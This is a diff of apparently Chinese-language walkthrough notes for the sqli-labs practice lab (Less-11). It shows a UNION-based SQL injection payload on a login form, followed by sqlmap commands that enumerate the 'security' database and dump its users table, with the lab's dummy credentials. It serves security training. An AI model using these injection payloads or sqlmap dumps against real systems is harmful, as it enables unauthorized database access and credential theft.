@@ -36,3 +36,46 @@ uname=0' union select group_concat(username,0x3a,password),2 from users--+&passw
 返回Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4
 
 方法二：
+sqlmap -r /root/桌面/sqlilabs_qiu/POST基于错误的注入Less11-14/Less-11/raw.txt --batch --current-db
+可知当前数据库名为security
+sqlmap -r /root/桌面/sqlilabs_qiu/POST基于错误的注入Less11-14/Less-11/raw.txt --batch -D security --tables
+Database: security                                                        
+[4 tables]
++----------+
+| emails   |
+| referers |
+| uagents  |
+| users    |
++----------+
+sqlmap -r /root/桌面/sqlilabs_qiu/POST基于错误的注入Less11-14/Less-11/raw.txt --batch -D security -T users --columns
+Database: security                                                        
+Table: users
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | int(3)      |
+| password | varchar(20) |
+| username | varchar(20) |
++----------+-------------+
+sqlmap -r /root/桌面/sqlilabs_qiu/POST基于错误的注入Less11-14/Less-11/raw.txt --batch -D security -T users -C username,password --dump
+Database: security                                                        
+Table: users
+[13 entries]
++----------+------------+
+| username | password   |
++----------+------------+
+| Dumb     | Dumb       |
+| Angelina | I-kill-you |
+| Dummy    | p@ssword   |
+| secure   | crappy     |
+| stupid   | stupidity  |
+| superman | genious    |
+| batman   | mob!le     |
+| admin    | 123        |
+| admin1   | admin1     |
+| admin2   | admin2     |
+| admin3   | admin3     |
+| dhakkan  | dumbo      |
+| admin4   | admin4     |
++----------+------------+
